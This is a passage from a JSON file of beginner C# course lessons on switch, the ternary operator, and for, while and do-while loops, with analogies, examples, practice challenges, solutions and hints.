              "content": "Imagine a traffic director at a busy intersection directing cars: 'If you're going to New York, take route 1. If you're going to Boston, take route 2. If you're going to DC, take route 3...'\n\nThat's what a SWITCH does! When you have ONE variable that could be many different values, and you want different code for each value, switch is cleaner than a long chain of if-else if.\n\nC# has TWO forms of switch:\n\n**Switch Statement (classic)**: Like a traffic director with a clipboard - checks cases, runs code blocks, needs 'break' statements.\n\n**Switch Expression (modern C# 8+)**: Like a vending machine - put in a value, get back a result. Shorter, cleaner, and RETURNS a value directly!\n\nSwitch is perfect when you're checking ONE variable against SPECIFIC values. Modern C# even lets you use patterns like ranges (> 10, < 5) and logical operators (and, or, not)!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates both switch statements and the modern switch expression syntax.",
              "code": "// === SWITCH STATEMENT (classic) ===\nint dayNumber = 3;\n\nswitch (dayNumber)\n{\n    case 1:\n        Console.WriteLine(\"Monday\");\n        break;\n    case 2:\n        Console.WriteLine(\"Tuesday\");\n        break;\n    case 3:\n        Console.WriteLine(\"Wednesday\");\n        break;\n    case 6:\n    case 7:\n        Console.WriteLine(\"Weekend!\");\n        break;\n    default:\n        Console.WriteLine(\"Invalid day\");\n        break;\n}\n\n// === SWITCH EXPRESSION (modern C# 8+) ===\n// Much cleaner! Returns a value directly.\nstring dayName = dayNumber switch\n{\n    1 => \"Monday\",\n    2 => \"Tuesday\",\n    3 => \"Wednesday\",\n    4 => \"Thursday\",\n    5 => \"Friday\",\n    6 or 7 => \"Weekend!\",   // 'or' pattern\n    _ => \"Invalid day\"       // _ is the default\n};\nConsole.WriteLine(dayName);\n\n// === PATTERN MATCHING in switch expressions ===\nint score = 85;\nstring grade = score switch\n{\n    >= 90 => \"A\",\n    >= 80 and < 90 => \"B\",   // relational + logical patterns\n    >= 70 and < 80 => \"C\",\n    >= 60 => \"D\",\n    _ => \"F\"\n};\nConsole.WriteLine($\"Grade: {grade}\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Switch Statement (Classic)\n\n**`switch (variable)`**: The variable in parentheses is what you're checking against each 'case'.\n\n**`case value:`**: Each 'case' is a possible value. Must be a constant (like 1, \"text\", etc.)!\n\n**`break;`**: CRITICAL! 'break' exits the switch. Don't forget it!\n\n**`default:`**: Runs if no case matches. Like 'else' at the end.\n\n## Switch Expression (Modern C# 8+)\n\n**`variable switch { }`**: Note the variable comes BEFORE 'switch'! The whole thing RETURNS a value.\n\n**`pattern => result`**: Use `=>` (arrow), not `:`. Each arm produces a value.\n\n**`_`**: The discard pattern - matches everything. It's your default case.\n\n**`Patterns`**: Use `or`/`and`/`not` keywords (not || or &&), plus relational operators like `>= 90`."
            },
            {
              "type": "WARNING",
              "title": "Watch Out!",
              "content": "## Common Pitfalls with Switch\n\n**Forgetting break (statements):** Without break, code 'falls through' to the next case! This is rarely intentional. Always end each case with `break`.\n\n**Using variables in case:** `case myVariable:` is WRONG! Case values must be compile-time constants. Use `when` clauses for dynamic conditions.\n\n**Switch expression exceptions:** If no pattern matches in a switch expression and there's no `_` default, you'll get a `SwitchExpressionException` at runtime!\n\n**Pattern order matters:** In switch expressions, patterns are checked top to bottom. Put more specific patterns first! `>= 90` should come before `>= 80`.\n\n**Confusing `or` with `||`:** In switch patterns, use the keyword `or` (not `||`). Example: `1 or 2 or 3 => \"Low\"`"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-03-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a simple calculator using switch!\n\n1. Create a string variable 'operation' (set to '+', '-', '*', or '/')\n2. Create int variables num1 = 10 and num2 = 5\n3. Use a switch statement on 'operation':\n   - case \"+\": Display num1 + num2\n   - case \"-\": Display num1 - num2\n   - case \"*\": Display num1 * num2\n   - case \"/\": Display num1 / num2\n   - default: Display 'Unknown operation'\n\nRemember to use break after each case!",
              "starterCode": "// Variables\nstring operation = \"+\";\nint num1 = 10;\nint num2 = 5;\n\n// Write your switch statement here",
              "solution": "// Variables\nstring operation = \"+\";\nint num1 = 10;\nint num2 = 5;\n\n// Write your switch statement here\nswitch (operation)\n{\n    case \"+\":\n        Console.WriteLine(num1 + num2);\n        break;\n    case \"-\":\n        Console.WriteLine(num1 - num2);\n        break;\n    case \"*\":\n        Console.WriteLine(num1 * num2);\n        break;\n    case \"/\":\n        Console.WriteLine(num1 / num2);\n        break;\n    default:\n        Console.WriteLine(\"Unknown operation\");\n        break;\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Addition should output 15 (10 + 5)",
                  "expectedOutput": "15",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Code should use switch statement",
                  "expectedOutput": "switch",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Code should have break statements",
                  "expectedOutput": "break",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Structure: switch (operation) { case \"+\": code here; break; case \"-\": code here; break; ... }. Don't forget break!"
                },
                {
                  "level": 2,
                  "text": "Forgetting break: Without break, code 'falls through' to the next case! Always end each case with break (unless you want fall-through)."
                },
                {
                  "level": 3,
                  "text": "Using variables in case: case myVariable: is WRONG! case values must be constants: case 1: or case \"text\":  "
                },
                {
                  "level": 4,
                  "text": "Forgetting quotes on strings: case jump: is wrong! String cases need quotes: case \"jump\":"
                },
                {
                  "level": 5,
                  "text": "Using conditions in case: You can't do case (x > 5): ! Switch only checks EQUALITY. Use if-else for conditions."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting break",
                  "consequence": "Without break, code 'falls through' to the next case! Always end each case with break (unless you want fall-through).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using variables in case",
                  "consequence": "case myVariable: is WRONG! case values must be constants: case 1: or case \"text\":",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting quotes on strings",
                  "consequence": "case jump: is wrong! String cases need quotes: case \"jump\":",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using conditions in case",
                  "consequence": "You can't do case (x > 5): ! Switch only checks EQUALITY. Use if-else for conditions.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-03-05",
          "title": "The Ternary Operator (Shortcut Decision)",
          "moduleId": "module-03",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Sometimes you need a simple if-else decision that just assigns a value. Writing a full if-else block feels like overkill:\n\n```\nstring message;\nif (score >= 50) {\n    message = \"Pass\";\n} else {\n    message = \"Fail\";\n}\n```\n\nC# has a SHORTCUT called the TERNARY OPERATOR (ternary means 'three parts'):\n\n```\nstring message = (score >= 50) ? \"Pass\" : \"Fail\";\n```\n\nOne line! It works like this:\n\n(condition) ? valueIfTrue : valueIfFalse\n\nThink of the ? as 'if this is true' and the : as 'otherwise'. It's like asking a yes/no question:\n\n'Is the score 50 or higher? If YES, assign \"Pass\". If NO, assign \"Fail\".'\n\nThe ternary operator is PERFECT for simple assignments but can get messy if overused. If your logic is complex, stick with regular if-else for readability!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// Regular if-else (verbose)\nint age = 20;\nstring status;\n\nif (age >= 18)\n{\n    status = \"Adult\";\n}\nelse\n{\n    status = \"Minor\";\n}\nConsole.WriteLine(status);\n\n// Ternary operator (concise!)\nint age2 = 20;\nstring status2 = (age2 >= 18) ? \"Adult\" : \"Minor\";\nConsole.WriteLine(status2);\n\n// Inline usage\nint score = 85;\nConsole.WriteLine(\"Result: \" + (score >= 60 ? \"Pass\" : \"Fail\"));\n\n// Multiple ternaries (careful - can get confusing!)\nint grade = 85;\nstring letter = (grade >= 90) ? \"A\" : \n                (grade >= 80) ? \"B\" : \n                (grade >= 70) ? \"C\" : \"F\";\nConsole.WriteLine(\"Grade: \" + letter);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`(condition) ? valueIfTrue : valueIfFalse`**: The three parts: condition to check, value if true (after ?), value if false (after :). The whole expression RETURNS a value!\n\n**`Parentheses around condition`**: The parentheses around the condition are optional but make it clearer: (age >= 18) ? ... is more readable than age >= 18 ? ...\n\n**`Returns a value`**: The ternary operator PRODUCES a value, so you can assign it: string x = condition ? \"yes\" : \"no\"; or use it inline: Console.WriteLine(x > 5 ? \"big\" : \"small\");\n\n**`Nested ternaries`**: You CAN nest ternaries but it gets hard to read fast! grade >= 90 ? \"A\" : grade >= 80 ? \"B\" : \"C\". Use regular if-else when it's complex!"
            },
            {
              "type": "WARNING",
              "title": "Watch Out!",
              "content": "## Common Pitfalls with the Ternary Operator\n\n**Forgetting the colon:** The `:` is REQUIRED! `condition ? trueValue` is incomplete and won't compile. You must have `: falseValue` at the end.\n\n**Mixing types:** Both values must be compatible types! `(age >= 18) ? \"Adult\" : 0` won't work - you can't mix string and int. Both sides should return the same type.\n\n**Overusing ternaries:** Nested ternaries get VERY hard to read. If you have 2+ levels deep, use if-else or a switch expression instead. Readability matters!\n\n**Not a statement:** You can't use ternary for actions: `condition ? DoThis() : DoThat();` is bad practice. It's for VALUES, not side effects. Use if-else for actions.\n\n**Prefer switch expressions for multiple cases:** If you're nesting ternaries like `a ? x : b ? y : c ? z : w`, a switch expression is cleaner and more readable."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-03-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a game status checker using the ternary operator!\n\n1. Create these variables:\n   - int health = 75\n   - int energy = 30\n2. Use ternary operators to create:\n   - string healthStatus = (health > 50) ? 'Healthy' : 'Injured'\n   - string energyStatus = (energy > 50) ? 'Energized' : 'Tired'\n3. Display both statuses\n\nBonus: Try changing the values to see different results!",
              "starterCode": "// Variables\nint health = 75;\nint energy = 30;\n\n// Use ternary operators to create status strings\n\n// Display the statuses",
              "solution": "// Variables\nint health = 75;\nint energy = 30;\n\n// Use ternary operators to create status strings\nstring healthStatus = (health > 50) ? \"Healthy\" : \"Injured\";\nstring energyStatus = (energy > 50) ? \"Energized\" : \"Tired\";\n\n// Display the statuses\nConsole.WriteLine(\"Health: \" + healthStatus);\nConsole.WriteLine(\"Energy: \" + energyStatus);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Health\"",
                  "expectedOutput": "Health",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Energy\"",
                  "expectedOutput": "Energy",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Format: variable = (condition) ? \"value if true\" : \"value if false\"; Remember the ? and : symbols!"
                },
                {
                  "level": 2,
                  "text": "Forgetting the colon: The : is REQUIRED! condition ? trueValue is incomplete. Must have : falseValue at the end."
                },
                {
                  "level": 3,
                  "text": "Using curly braces: Don't write (age >= 18) ? { 'Adult' } - the values don't use braces, just the value itself!"
                },
                {
                  "level": 4,
                  "text": "Mixing types: (age >= 18) ? 'Adult' : 0 is WRONG! Both values must be the same type (both strings, both ints, etc.)."
                },
                {
                  "level": 5,
                  "text": "Overusing ternaries: Nested ternaries get VERY hard to read. If you have 3+ levels, use if-else instead for clarity!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting the colon",
                  "consequence": "The : is REQUIRED! condition ? trueValue is incomplete. Must have : falseValue at the end.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using curly braces",
                  "consequence": "Don't write (age >= 18) ? { 'Adult' } - the values don't use braces, just the value itself!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Mixing types",
                  "consequence": "(age >= 18) ? 'Adult' : 0 is WRONG! Both values must be the same type (both strings, both ints, etc.).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Overusing ternaries",
                  "consequence": "Nested ternaries get VERY hard to read. If you have 3+ levels, use if-else instead for clarity!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        }
      ]
    },
    {
      "id": "module-04",
      "title": "Loops and Iteration",
      "description": "Master for loops, while loops, do-while loops, nested loops, and the foreach statement.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-04-01",
          "title": "The for Loop (When You Know the Count)",
          "moduleId": "module-04",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you need to write 'I will not talk in class' 100 times on the blackboard. You wouldn't write it once and think 'okay, done!' - you'd repeat it exactly 100 times.\n\nThat's what a FOR LOOP does! It repeats code a SPECIFIC number of times. You tell it:\n1. Where to start (I'm starting at line 1)\n2. When to stop (Keep going until I reach line 100)\n3. How to count (Add 1 each time)\n\nThink of it like a countdown: '10, 9, 8, 7...' or a count-up: '1, 2, 3, 4...'. The for loop handles the counting FOR you!\n\nThe for loop is PERFECT when you know EXACTLY how many times to repeat. Need to process 50 items? Use a for loop counting from 0 to 49. Need to print numbers 1 to 10? For loop!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "The for loop has three parts in the parentheses: initialization (where to start), condition (when to stop), and increment (how to change the counter). Each part is separated by semicolons. The loop body executes repeatedly until the condition becomes false.",
              "code": "// Basic for loop - count from 1 to 5\nfor (int i = 1; i <= 5; i++)\n{\n    Console.WriteLine(\"Number: \" + i);\n}\n\n// Countdown\nfor (int countdown = 10; countdown >= 1; countdown--)\n{\n    Console.WriteLine(countdown);\n}\nConsole.WriteLine(\"Blast off!\");\n\n// Count by 2s\nfor (int i = 0; i <= 10; i += 2)\n{\n    Console.WriteLine(\"Even number: \" + i);\n}\n\n// Real-world: print a multiplication table\nint number = 5;\nfor (int i = 1; i <= 10; i++)\n{\n    Console.WriteLine($\"{number} x {i} = {number * i}\");\n}\n\n// Modern C#: Use foreach when iterating collections\nstring[] fruits = { \"apple\", \"banana\", \"cherry\" };\nforeach (string fruit in fruits)\n{\n    Console.WriteLine(fruit);\n}\n\n// Performance tip: for loops with arrays can be faster\n// than foreach in performance-critical code\nfor (int i = 0; i < fruits.Length; i++)\n{\n    Console.WriteLine(fruits[i]);\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`for (initialization; condition; increment)`**: Three parts separated by semicolons: 1) Start point (int i = 0), 2) When to stop (i < 10), 3) How to change i each time (i++)\n\n**`int i = 1`**: INITIALIZATION: Creates a counter variable (usually called i, j, or k). This runs ONCE at the start. i typically starts at 0 or 1.\n\n**`i <= 5`**: CONDITION: Checked BEFORE each loop. If true, the loop runs. If false, the loop stops. Here: 'keep going while i is 5 or less'.\n\n**`i++`**: INCREMENT: Runs AFTER each loop iteration. i++ adds 1 to i. Could also be i--, i += 2, etc. This moves you closer to the end!\n\n**`Loop body { }`**: The code in braces runs each time. If the loop runs 5 times, this code executes 5 times with different values of i!\n\n**`for vs foreach`**: Use `for` when you need the index or exact count control. Use `foreach` when iterating collections in forward order without modifying them - it's cleaner and less error-prone."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Off-by-one errors**: `for (int i = 0; i < 10; i++)` runs 10 times (0-9), but `for (int i = 0; i <= 10; i++)` runs 11 times (0-10). Be careful with `<` vs `<=`!\n\n**Infinite loops**: `for (int i = 0; i >= 0; i++)` never ends because i is ALWAYS >= 0 when incrementing! Make sure your condition eventually becomes false.\n\n**Modifying loop variable inside the body**: Changing `i` inside the loop body causes confusing behavior. Let the increment part handle it.\n\n**Using commas instead of semicolons**: `for (int i = 0, i < 10, i++)` is WRONG! The three parts are separated by semicolons, not commas.\n\n**Forgetting braces for multi-line bodies**: Without braces, only the first line is part of the loop. Always use braces to avoid bugs!"
            },
            {
              "type": "DEEP_DIVE",
              "title": "Loop Performance: What Actually Happens",
              "content": "## Understanding Loop Performance at the Hardware Level\n\nWhen you write a loop in C#, there's a lot happening behind the scenes. The JIT (Just-In-Time) compiler optimizes your code, and different loop constructs have different performance characteristics. Let's explore what actually happens when you iterate over collections in your ShopFlow e-commerce application.\n\n### Array vs List Iteration\n\nArrays offer the fastest iteration because they provide direct memory access. When you access `products[i]`, the runtime calculates the exact memory address using pointer arithmetic: `baseAddress + (i * elementSize)`. This is a single CPU operation.\n\nLists (`List<T>`) are backed by an internal array, but accessing elements requires an additional bounds check and method call overhead. However, the JIT compiler is smart enough to eliminate most of this overhead in tight loops through a process called \"bounds check elimination.\"\n\n```csharp\n// Direct array access - fastest for hot paths\nProduct[] products = GetProductArray();\nfor (int i = 0; i < products.Length; i++)\n{\n    ProcessProduct(products[i]);\n}\n\n// List iteration - nearly identical after JIT optimization\nList<Product> productList = GetProductList();\nfor (int i = 0; i < productList.Count; i++)\n{\n    ProcessProduct(productList[i]);\n}\n```\n\n### for vs foreach: When to Use Each\n\nThe `for` loop gives you index-based access and complete control over iteration. The `foreach` loop uses an enumerator pattern, which traditionally added overhead. However, modern C# heavily optimizes foreach:\n\n**For arrays**: The compiler transforms `foreach` into an indexed `for` loop automatically. There's zero performance difference.\n\n**For List<T>**: The compiler uses a struct-based enumerator that avoids heap allocations. Performance is nearly identical to a `for` loop.\n\n**For IEnumerable<T>**: This requires interface dispatch and potentially boxing. Use sparingly in performance-critical code.\n\n```csharp\n// Both compile to nearly identical IL for arrays\nforeach (var item in cartItems) { Process(item); }\nfor (int i = 0; i < cartItems.Length; i++) { Process(cartItems[i]); }\n\n// When you need the index, for is cleaner\nfor (int i = 0; i < orders.Count; i++)\n{\n    Console.WriteLine($\"Order {i + 1}: {orders[i].Total}\");\n}\n```\n\n### LINQ vs Loops: The Readability-Performance Trade-off\n\nLINQ provides elegant, declarative code but comes with costs: delegate allocations, iterator overhead, and captured variable closures. For most code, this doesn't matter. For hot paths processing thousands of items per second, it can.\n\n```csharp\n// LINQ - readable, but allocates\nvar expensiveItems = products.Where(p => p.Price > 100).ToList();\n\n// Loop - more verbose, but zero allocations\nvar expensiveItems = new List<Product>();\nforeach (var p in products)\n{\n    if (p.Price > 100)\n        expensiveItems.Add(p);\n}\n```\n\n**Rule of thumb**: Use LINQ for clarity in business logic. Switch to loops only when profiling shows a bottleneck.\n\n### Span<T> for Ultimate Performance\n\n`Span<T>` provides array-like performance with added safety and flexibility. It's a stack-only type that can reference arrays, stack memory, or native buffers without allocations.\n\n```csharp\n// Process a slice of inventory without copying\nReadOnlySpan<Product> topProducts = products.AsSpan(0, 10);\nforeach (var product in topProducts)\n{\n    DisplayProduct(product);\n}\n\n// Parse CSV without string allocations\nReadOnlySpan<char> line = csvLine.AsSpan();\nint commaIndex = line.IndexOf(',');\nReadOnlySpan<char> productName = line.Slice(0, commaIndex);\n```\n\n### Practical Guidance for E-commerce Code\n\n1. **Product catalog browsing**: Use LINQ for filtering and sorting. The readability benefit outweighs the small performance cost.\n\n2. **Bulk order processing**: Consider switching to for loops with arrays when processing thousands of orders in batch jobs.\n\n3. **Real-time inventory updates**: Profile first, then optimize. `Span<T>` can help when parsing high-frequency data feeds.\n\n4. **General rule**: Write clear code first. Optimize only what benchmarks prove is slow."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-04-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a program that displays a countdown for a rocket launch!\n\n1. Use a for loop to count down from 10 to 1\n2. Display each number\n3. After the loop ends, display 'Liftoff!'\n\nBonus: Try making it count from 20 to 1, or count by 2s!",
              "starterCode": "// Create a countdown from 10 to 1\n// Remember: for (start; condition; change)\n\n// After the loop, display \"Liftoff!\"",
              "solution": "// Create a countdown from 10 to 1\nfor (int i = 10; i >= 1; i--)\n{\n    Console.WriteLine(i);\n}\n\n// After the loop, display \"Liftoff!\"\nConsole.WriteLine(\"Liftoff!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Liftoff\"",
                  "expectedOutput": "Liftoff",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start at 10: int i = 10. Keep going while i >= 1. Count down: i--. Structure: for (int i = 10; i >= 1; i--) { }"
                },
                {
                  "level": 2,
                  "text": "Using commas instead of semicolons: for (int i = 0, i < 10, i++) is WRONG! Use semicolons: for (int i = 0; i < 10; i++)"
                },
                {
                  "level": 3,
                  "text": "Infinite loops from wrong condition: for (int i = 0; i >= 0; i++) never ends because i is ALWAYS >= 0! Make sure your condition eventually becomes false."
                },
                {
                  "level": 4,
                  "text": "Off-by-one errors: for (int i = 0; i < 10; i++) runs 10 times (0-9). for (int i = 0; i <= 10; i++) runs 11 times (0-10)!"
                },
                {
                  "level": 5,
                  "text": "Forgetting the increment: for (int i = 0; i < 10; ) with no i++ creates an infinite loop! i never changes so i < 10 is always true."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using commas instead of semicolons",
                  "consequence": "for (int i = 0, i < 10, i++) is WRONG! Use semicolons: for (int i = 0; i < 10; i++)",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Infinite loops from wrong condition",
                  "consequence": "for (int i = 0; i >= 0; i++) never ends because i is ALWAYS >= 0! Make sure your condition eventually becomes false.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Off-by-one errors",
                  "consequence": "for (int i = 0; i < 10; i++) runs 10 times (0-9). for (int i = 0; i <= 10; i++) runs 11 times (0-10)!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting the increment",
                  "consequence": "for (int i = 0; i < 10; ) with no i++ creates an infinite loop! i never changes so i < 10 is always true.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-04-02",
          "title": "The while Loop (When You Don't Know)",
          "moduleId": "module-04",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're flipping a coin repeatedly until you get heads. How many flips will it take? You don't know! Could be 1, could be 10, could be 50.\n\nThat's when you use a WHILE loop! Unlike a for loop (which counts a specific number of times), a while loop says: 'WHILE this condition is true, keep repeating.'\n\nThink of it like checking your phone: 'While I have unread messages, keep reading them.' You don't know how many messages there are - you just keep going WHILE there are more!\n\nOr waiting in line: 'While the line is not empty, keep moving forward.' The line could be 3 people or 300 people - the while loop handles it!\n\nWhile loops are PERFECT when you don't know how many times to repeat, but you know the CONDITION to stop."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "The while loop checks its condition BEFORE each iteration. If the condition is true, the loop body executes. Something inside the loop must eventually make the condition false, or you get an infinite loop!",
              "code": "// Simple while loop\nint count = 1;\n\nwhile (count <= 5)\n{\n    Console.WriteLine($\"Count is: {count}\");\n    count++;  // CRITICAL! Must change count or loop never ends!\n}\n\n// User input validation (keep asking until valid)\nbool validInput = false;\nint userAge = 0;\n\n// Simulating user input\nuserAge = 15; // Pretend user entered this\n\nwhile (!validInput)\n{\n    if (userAge >= 18)\n    {\n        Console.WriteLine(\"Valid age!\");\n        validInput = true;\n    }\n    else\n    {\n        Console.WriteLine(\"You must be 18 or older.\");\n        validInput = true; // For this example, we stop after one check\n    }\n}\n\n// Countdown with while\nint countdown = 5;\nwhile (countdown > 0)\n{\n    Console.WriteLine(countdown);\n    countdown--;\n}\nConsole.WriteLine(\"Done!\");\n\n// Real-world: Processing until a sentinel value\nint[] data = { 5, 10, 15, -1 };  // -1 is sentinel (end marker)\nint index = 0;\n\nwhile (data[index] != -1)\n{\n    Console.WriteLine($\"Processing: {data[index]}\");\n    index++;\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`while (condition)`**: The loop checks the condition BEFORE each iteration. If true, the loop body runs. If false, the loop stops and continues after the braces.\n\n**`Condition checked FIRST`**: Unlike do-while (coming soon!), while checks BEFORE running. If the condition starts as false, the loop body NEVER runs, not even once!\n\n**`Must change something!`**: CRITICAL: Something inside the loop MUST eventually make the condition false! Otherwise you get an INFINITE LOOP and your program hangs forever.\n\n**`while vs for`**: Use FOR when you know the count (repeat 10 times). Use WHILE when you're checking a condition (repeat until user enters valid input).\n\n**`Sentinel values`**: A common pattern uses a special value (like -1 or null) to signal when to stop. The while loop keeps processing until it encounters this sentinel."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Infinite loops**: The #1 mistake! Forgetting to change the condition variable inside the loop: `while (x < 10) { /* oops, x never changes! */ }` hangs forever.\n\n**Semicolon after while**: `while (condition);` is a silent bug! The semicolon creates an empty loop body, and your actual code runs only once after the (infinite) loop ends.\n\n**Condition never true**: If the condition starts false, the loop body NEVER runs: `int x = 100; while (x < 50) { /* never executes */ }`\n\n**Changing the wrong variable**: If your condition checks `count`, make sure you're modifying `count` inside the loop, not some unrelated variable!\n\n**Not using braces**: Without braces, only the FIRST statement is part of the loop. Always use braces to avoid subtle bugs!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-04-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a password strength checker!\n\n1. Create an int variable 'passwordLength' starting at 3\n2. Use a while loop: while (passwordLength < 8)\n3. Inside the loop: display 'Password too short: [length] characters'\n4. Increment passwordLength by 1 each time\n5. After the loop: display 'Password is strong!'\n\nWatch it count up from 3 to 7, then stop!",
              "starterCode": "// Create password length variable\nint passwordLength = 3;\n\n// While loop to check password strength\n\n// After loop ends",
              "solution": "// Create password length variable\nint passwordLength = 3;\n\n// While loop to check password strength\nwhile (passwordLength < 8)\n{\n    Console.WriteLine(\"Password too short: \" + passwordLength + \" characters\");\n    passwordLength++;\n}\n\n// After loop ends\nConsole.WriteLine(\"Password is strong!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Password\"",
                  "expectedOutput": "Password",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Structure: while (condition) { code here; change something; }. Don't forget to increment passwordLength inside the loop!"
                },
                {
                  "level": 2,
                  "text": "Infinite loops: Forgetting to change the condition variable inside the loop! while (x < 10) without increasing x = infinite loop!"
                },
                {
                  "level": 3,
                  "text": "Semicolon after while: while (condition); is WRONG! No semicolon before the {. It's while (condition) { }"
                },
                {
                  "level": 4,
                  "text": "Not entering the loop: If the condition is false from the start, the loop body NEVER runs. while (5 < 3) { } - this code never executes!"
                },
                {
                  "level": 5,
                  "text": "Changing wrong variable: If your condition checks 'count', make sure you're changing COUNT inside the loop, not some other variable!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Infinite loops",
                  "consequence": "Forgetting to change the condition variable inside the loop! while (x < 10) without increasing x = infinite loop!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Semicolon after while",
                  "consequence": "while (condition); is WRONG! No semicolon before the {. It's while (condition) { }",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not entering the loop",
                  "consequence": "If the condition is false from the start, the loop body NEVER runs. while (5 < 3) { } - this code never executes!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Changing wrong variable",
                  "consequence": "If your condition checks 'count', make sure you're changing COUNT inside the loop, not some other variable!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-04-03",
          "title": "The do-while Loop (At Least Once)",
          "moduleId": "module-04",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a restaurant: 'Please tell me what you'd like to order.' They ask you at LEAST ONCE, even if you say 'I'm not hungry.' They don't check if you're hungry BEFORE asking - they ask FIRST, then check if you want more.\n\nThat's a DO-WHILE loop! It's like a while loop, but the condition is checked at the END, not the beginning. This guarantees the code runs AT LEAST ONCE!\n\nThink of it like trying a food sample at the grocery store:\n• Regular while: 'While you're hungry, take a sample' → If you're not hungry, you take ZERO samples\n• Do-while: 'Take a sample. Still hungry? Take another!' → You ALWAYS get at least one sample\n\nDo-while is perfect for menus, user input prompts, or anything where you need to do something at least once before checking a condition."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "The do-while loop executes its body FIRST, then checks the condition. This guarantees the code runs at least once, even if the condition is initially false. Notice the required semicolon after the while condition!",
